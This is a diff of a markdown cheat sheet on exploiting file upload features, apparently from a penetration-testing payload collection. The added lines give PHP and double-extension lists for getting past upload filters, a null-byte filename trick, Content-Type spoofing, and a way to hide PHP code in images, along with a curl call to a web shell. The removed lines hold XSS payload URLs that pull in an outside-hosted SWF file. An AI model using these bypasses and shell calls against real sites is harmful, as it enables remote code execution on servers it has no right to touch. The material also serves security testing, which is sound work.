@@ -4,7 +4,49 @@ Uploaded files may pose a significant risk if not handled correctly. A remote at
 
 ## Exploits
 
-### Image Tragik
+### PHP Extension
+
+```powershell
+.php
+.php3
+.php4
+.php5
+.php7
+
+Less known extensions
+.pht
+.phar
+.phpt
+.pgif
+.phtml
+
+Double extensions
+.jpeg.php
+.jpg.php
+.png.php
+```
+
+### Upload tricks
+
+- Null byte (eg: shell.php%00.gif, shell.php%00.png)
+- Mime type, change `Content-Type : application/x-php` or `Content-Type : application/octet-stream` to `Content-Type : image/gif`
+
+### Picture upload with LFI
+
+Valid pictures hosting PHP code. Upload the picture and use a local file inclusion to execute the code. The shell can be called with the following command : `curl 'http://localhost/test.php?0=system' --data "1='ls'"`.
+
+- Picture Metadata, hide the payload inside a comment tag in the metadata.
+- Picture Resize, hide the payload within the compression algorithm in order to bypass a resize. Also defeating `getimagesize()` and `imagecreatefromgif()`.
+
+### Configuration Files
+
+- .htaccess
+- web.config
+- httpd.conf
+- \_\_init\_\_.py
+
+
+### CVE - Image Tragik
 
 ```powershell
 HTTP Request
@@ -12,57 +54,9 @@ Reverse Shell
 Touch command
 ```
 
-### PHP Extension
-
-```powershell
-.php
-
-Less known extension
-.pht
-.pgif
-.phtml
-.shtml
-
-Double extension
-.jpeg.php
-.png.php
-```
-
-### PNG Bypass a resize
-
-Upload the picture and use a local file inclusion
-
-```powershell
-You can use it by specifying $_GET[0] as shell_exec and passing a $_POST[1] parameter with the shell command to execute.
-curl 'http://localhost/b.php?0=shell_exec' --data "1='ls'"
-curl 'http://localhost/test.php?0=system' --data "1='ls'"
-```
-
-### JPG Bypass a resize
-
-Upload the picture and use a local file inclusion
-
-```powershell
-http://localhost/test.php?c=ls
-```
-
-### XSS via SWF
-
-As you may already know, it is possible to make a website vulnerable to XSS if you can upload/include a SWF file into that website. I am going to represent this SWF file that you can use in your PoCs.
-This method is based on [1] and [2], and it has been tested in Google Chrome, Mozilla Firefox, IE9/8; there should not be any problem with other browsers either.
-
-```powershell
-Browsers other than IE: http://0me.me/demo/xss/xssproject.swf?js=alert(document.domain);
-
-IE8: http://0me.me/demo/xss/xssproject.swf?js=try{alert(document.domain)}catch(e){ window.open(‘?js=history.go(-1)’,’_self’);}
-
-IE9: http://0me.me/demo/xss/xssproject.swf?js=w=window.open(‘invalidfileinvalidfileinvalidfile’,’target’);setTimeout(‘alert(w.document.location);w.close();’,1);
-```
-
-### .htaccess
-
-An .htaccess file is a way to configure the details of your website without needed to alter the server config files. 
-
 ## References
 
 * Bulletproof Jpegs Generator - Damien "virtualabs" Cauquil
+* [BookFresh Tricky File Upload Bypass to RCE, NOV 29, 2014 - AHMED ABOUL-ELA](https://secgeek.net/bookfresh-vulnerability/)
+* [Encoding Web Shells in PNG IDAT chunks, 04-06-2012, phil](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)
+* [La PNG qui se prenait pour du PHP, 23 février 2014](https://phil242.wordpress.com/2014/02/23/la-png-qui-se-prenait-pour-du-php/)
